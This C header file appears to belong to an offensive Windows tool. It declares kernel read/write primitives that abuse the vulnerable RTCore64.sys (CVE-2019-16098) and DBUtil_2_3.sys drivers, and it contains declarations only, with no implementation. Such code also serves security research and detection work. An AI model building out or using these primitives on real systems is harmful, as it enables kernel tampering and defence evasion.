/*

--- Kernel memory Read / Write primitives through the vulnerable Micro-Star MSI Afterburner driver.
--- Source and credit: https://github.com/Barakat/CVE-2019-16098/blob/master/CVE-2019-16098.cpp

*/

#pragma once

#include <Windows.h>

#define RTCore 0
#define DBUtil 1
// Select the driver to use with the following #define
#define VULN_DRIVER RTCore

#if VULN_DRIVER == RTCore
#define DEFAULT_DRIVER_FILE TEXT("RTCore64.sys")
#define CloseDriverHandle CloseDriverHandle_RTCore
#define ReadMemoryPrimitive ReadMemoryPrimitive_RTCore
#define WriteMemoryPrimitive WriteMemoryPrimitive_RTCore
#elif VULN_DRIVER == DBUtil
#define DEFAULT_DRIVER_FILE TEXT("DBUtil_2_3.sys")
#define CloseDriverHandle CloseDriverHandle_DBUtil
#define ReadMemoryPrimitive ReadMemoryPrimitive_DBUtil
#define WriteMemoryPrimitive WriteMemoryPrimitive_DBUtil
#endif


BYTE    ReadMemoryBYTE(DWORD64 Address);
WORD    ReadMemoryWORD(DWORD64 Address);
DWORD   ReadMemoryDWORD(DWORD64 Address);
DWORD64 ReadMemoryDWORD64(DWORD64 Address);

BYTE    ReadKernelMemoryBYTE(DWORD64 Offset);
WORD    ReadKernelMemoryWORD(DWORD64 Offset);
DWORD   ReadKernelMemoryDWORD(DWORD64 Offset);
DWORD64 ReadKernelMemoryDWORD64(DWORD64 Offset);

VOID ReadMemory(DWORD64 Address, PVOID Buffer, SIZE_T Size);

void WriteMemoryBYTE(DWORD64 Address, BYTE Value);
void WriteMemoryWORD(DWORD64 Address, WORD Value);
void WriteMemoryDWORD(DWORD64 Address, DWORD Value);
void WriteMemoryDWORD64(DWORD64 Address, DWORD64 Value);

void WriteKernelMemoryBYTE(DWORD64 Offset, BYTE Value);
void WriteKernelMemoryWORD(DWORD64 Offset, WORD Value);
void WriteKernelMemoryDWORD(DWORD64 Offset, DWORD Value);
void WriteKernelMemoryDWORD64(DWORD64 Offset, DWORD64 Value);

VOID WriteMemory(DWORD64 Address, PVOID Buffer, SIZE_T Size);

VOID CloseDriverHandle();

BOOL TestReadPrimitive();
